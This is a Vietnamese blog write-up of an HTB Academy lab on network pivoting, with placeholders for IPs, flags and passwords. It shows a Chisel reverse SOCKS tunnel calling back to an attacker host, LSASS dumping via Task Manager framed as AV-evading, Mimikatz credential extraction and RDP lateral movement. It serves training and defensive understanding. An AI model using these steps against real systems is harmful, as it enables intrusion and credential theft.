---
title: "HTB Academy Pivot Skill Assessment — Public Write-up"
date: 2026-04-26 10:00:00 +0700
categories: [HTB_CPTS, Skill Assessment, Pivot]
tags: [htb-academy, cpts, pivoting, tunneling, chisel, socks5, rdp, mimikatz]
description: "Public-safe write-up for HTB Academy Network Pivoting & Tunneling skill assessment."
pin: false
math: false
mermaid: true
---

> **Public note:** Đây là phiên bản portfolio đã được redact. IP nội bộ, flags, passwords và hashes đã được thay bằng placeholder để tránh lộ đáp án/lab spoiler trực tiếp. Nội dung tập trung vào methodology, attack chain và key takeaways.

**Module:** Network Pivoting & Tunneling  
**Date:** 26/04/2026  
**Author:** youngkevinn

---
## Mục tiêu

Xâm nhập vào internal network thông qua các kỹ thuật pivoting, leo thang qua nhiều subnet, và lấy flag tại từng máy mục tiêu.

---
## Attack Chain Overview

```
Kali (<ATTACK_IP>)
  │
  ├─[Chisel SOCKS5 :1080]──→ <PIVOT_WEB_IP> (pivot-web01)
  │                                 │
  │                         [SSH + RDP qua proxychains]
  │                                 │
  │                          <PIVOT_SRV_IP> (PIVOT-SRV01)          
  │                          mlefay / <REDACTED_PASSWORD>
  │                          Task Manager → lsass.DMP
  │                          Mimikatz minidump → vfrank cleartext
  │                                 │
  │                         [mstsc trực tiếp từ <PIVOT_SRV_IP>]
  │                                 │
  │                          <WORKSTATION_IP> (Workstation)           
  │                          vfrank / <REDACTED_PASSWORD>
  │                                 │
  │                         [Mapped Drive Z: AutomateDCAdmin]
  │                                 │
  └──────────────────────→ Domain Controller                    
```

---
## Phase 1 — Recon & Initial Access

### Nmap scan target ban đầu

```bash
nmap -sV <TARGET_IP>
```

**Kết quả:**

```
22/tcp open  ssh
80/tcp open  http
```

### Web Shell trên port 80

Port 80 có sẵn web shell → dùng để enumerate hệ thống.

### Phát hiện dual NIC trên web server

```bash
ip a
```

**Kết quả:**

```
ens160: <TARGET_IP>/16   ← External (HTB network)
ens192: <PIVOT_WEB_IP>/16      ← Internal network
```

### Tìm credentials trong file nhạy cảm

```bash
ls /home/webadmin/
# for-admin-eyes-only  id_rsa

cat /home/webadmin/for-admin-eyes-only
```

**Kết quả:**

```
user account: mlefay
password: <REDACTED_PASSWORD>
```

Transfer `id_rsa` về Kali, set permission:

```bash
chmod 600 id_rsa
```

**Credentials:** `mlefay:<REDACTED_PASSWORD>`

---
## Phase 2 — Pivot 1: Kali → 172.16.5.x (SOCKS5 với Chisel)

### Setup Chisel SOCKS5 Tunnel

**Trên Kali:**

```bash
sudo chisel server --reverse -v -p 8080 --socks5
```

**Upload Chisel lên web server qua web shell, rồi chạy client:**

```bash
/tmp/chisel client <ATTACK_IP>:8080 R:socks
```

**Kết quả:**

```
server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
server: session#1: tun: SSH connected
```

**Cấu hình proxychains:**

```
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

### Host Discovery trong 172.16.5.0/24

Ping sweep qua SSH vào web pivot:

```bash
ssh -i id_rsa webadmin@<TARGET_IP>

for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**Kết quả:**

```
64 bytes from <PIVOT_WEB_IP>: icmp_seq=1 ttl=64  ← web pivot (chính nó)
64 bytes from <PIVOT_SRV_IP>: icmp_seq=1 ttl=128 ← host mới!
```

**Host phát hiện:** `<PIVOT_SRV_IP>`

### RDP vào PIVOT-SRV01

```bash
proxychains xfreerdp /v:<PIVOT_SRV_IP> /u:mlefay /p:'<REDACTED_PASSWORD>' \
  /drive:share,/home/youngkevinn/mimikatz_bin/x64 /cert-ignore
```

**Flag Q4:**

```powershell
type C:\Flag.txt
# <REDACTED_FLAG>
```

---
## Phase 3 — Credential Harvesting: LSASS Dump với Mimikatz

> **Hint:** "We may be able to find something stored in LSASS."

### Bước 1: Tạo LSASS dump file qua Task Manager

Trong RDP session trên `<PIVOT_SRV_IP>`:

1. Chuột phải taskbar → **Task Manager**
2. **More details** → tab **Processes**
3. Tìm **Local Security Authority Process (lsass.exe)**
4. Chuột phải → **Create dump file**
5. Dump được lưu tại: `C:\Users\mlefay\AppData\Local\Temp\lsass.DMP`

### Bước 2: Phân tích dump với Mimikatz

Transfer `mimikatz.exe` qua RDP drive share (`\\tsclient\share\mimikatz.exe`).

Chạy Mimikatz **as Administrator**:

```
mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
# Switch to : minidump

mimikatz # sekurlsa::LogonPasswords
```

### Bước 3: Kết quả — tìm được vfrank

```
Authentication Id : 0 ; 160843
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT

  msv:
    * NTLM : <REDACTED_NTLM_HASH>
    * SHA1 : <REDACTED_SHA1>

  kerberos:
    * Username : vfrank
    * Domain   : INLANEFREIGHT.LOCAL
    * Password : <REDACTED_PASSWORD>   ← Cleartext!
```

> **Insight:** vfrank là service account chạy dưới dạng "Service from 0" session trên PIVOT-SRV01 → password bị lưu cleartext trong Kerberos section của LSASS memory. Đây là hậu quả của việc dùng user account thường thay vì Managed Service Account (MSA/gMSA).

**Answer Q5:** `<REDACTED>`

---
## Phase 4 — Pivot 2: <PIVOT_SRV_IP> → 172.16.6.x (RDP trực tiếp)

### Phát hiện dual NIC trên PIVOT-SRV01

```powershell
ipconfig /all
```

**Kết quả:**

```
Ethernet0: <PIVOT_SRV_IP>   ← Subnet đã biết
Ethernet1: <PIVOT_SRV_SECOND_NIC>   ← Subnet mới!
```

### Host Discovery trong 172.16.6.0/24

```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

**Kết quả:**

```
<WORKSTATION_IP>: True   ← Workstation target
<PIVOT_SRV_SECOND_NIC>: True
<INTERNAL_HOST_IP>: True
```

**Target workstation:** `<WORKSTATION_IP>`

### RDP từ PIVOT-SRV01 vào Workstation

Từ RDP session đang có trên `<PIVOT_SRV_IP>`, mở **Run** (Win + R) → `mstsc`:

- **Computer:** `<WORKSTATION_IP>`
- **Username:** `vfrank`
- **Password:** `<REDACTED_PASSWORD>`

> **Lý do không tunnel từ Kali:** Firewall trên 172.16.6.x chặn traffic từ ngoài, nhưng cho phép RDP từ cùng subnet nội bộ → pivot trực tiếp từ <PIVOT_SRV_IP> là cách duy nhất hiệu quả.

### Lấy Flag

```powershell
type C:\Flag.txt
# <REDACTED_FLAG>
```

**Flag Q6:** `<REDACTED_FLAG>` ✅

---
## Phase 5 — Domain Controller Access qua Mapped Drive

### Phát hiện Mapped Network Drive

Trong RDP session trên `<WORKSTATION_IP>` (vfrank), mở **File Explorer**:

```
This PC → AutomateDCAdmin (Z:)
```

Drive `Z:` là network share tự động map tới Domain Controller.

### Lấy Flag từ DC

```powershell
Z:
dir
type Flag.txt
# <REDACTED_FLAG>
```

**Flag Q7:** `<REDACTED_FLAG>` ✅

---
## Flags Summary

|Question|Flag|Location|
|---|---|---|
|Q4|`<REDACTED_FLAG>`|`C:\Flag.txt` trên <PIVOT_SRV_IP>|
|Q6|`<REDACTED_FLAG>`|`C:\Flag.txt` trên <WORKSTATION_IP>|
|Q7|`<REDACTED_FLAG>`|`Z:\Flag.txt` (DC mapped drive)|

---

## Credentials Summary

|Username|Password|Source|Dùng để vào|
|---|---|---|---|
|webadmin|_(id_rsa)_|SSH key trong web shell|<PIVOT_WEB_IP>|
|mlefay|`<REDACTED_PASSWORD>`|`/home/webadmin/for-admin-eyes-only`|<PIVOT_SRV_IP>|
|vfrank|`<REDACTED_PASSWORD>`|LSASS minidump (Mimikatz)|<WORKSTATION_IP>|

---

## Techniques Used

|Technique|Tool|Mục đích|
|---|---|---|
|SOCKS5 Tunneling|Chisel|Pivot Kali → 172.16.5.x|
|Ping sweep|bash one-liner|Host discovery 172.16.5.0/24|
|RDP Drive Share|xfreerdp `/drive:`|Transfer Mimikatz vào internal|
|LSASS Dump|Task Manager|Tạo dump file không cần tool đặc biệt, bypass AV|
|Credential Extraction|Mimikatz `sekurlsa::minidump`|Parse LSASS dump → cleartext password|
|PowerShell Ping Sweep|`Test-Connection`|Host discovery 172.16.6.0/24|
|RDP Lateral Movement|mstsc|Pivot từ <PIVOT_SRV_IP> → <WORKSTATION_IP>|
|Mapped Drive Abuse|File Explorer / cmd|Truy cập DC qua network share Z:|

---
## Key Takeaways

1. **Credentials lưu plaintext** — file `for-admin-eyes-only` không được bảo vệ, lưu credentials dạng plaintext.
2. **Service account dùng sai cách** — vfrank là user account thường được dùng cho service → password lưu cleartext trong LSASS Kerberos section. Nên dùng gMSA thay thế.
3. **LSASS dump không cần tool đặc biệt** — Task Manager có thể tạo dump file mà không trigger AV, sau đó phân tích offline bằng Mimikatz `sekurlsa::minidump`.
4. **Dual NIC = pivot opportunity** — mỗi machine có 2 NIC là dấu hiệu có thêm subnet cần enumerate.
5. **Pivot từ bên trong hiệu quả hơn tunnel** — RDP từ <PIVOT_SRV_IP> vào <WORKSTATION_IP> trực tiếp bypass được firewall, thay vì cố tunnel qua proxychains từ Kali.
6. **Mapped drive = implicit trust** — Share `AutomateDCAdmin (Z:)` tự động map cho vfrank → misconfigured access control dẫn đến lộ DC flag.
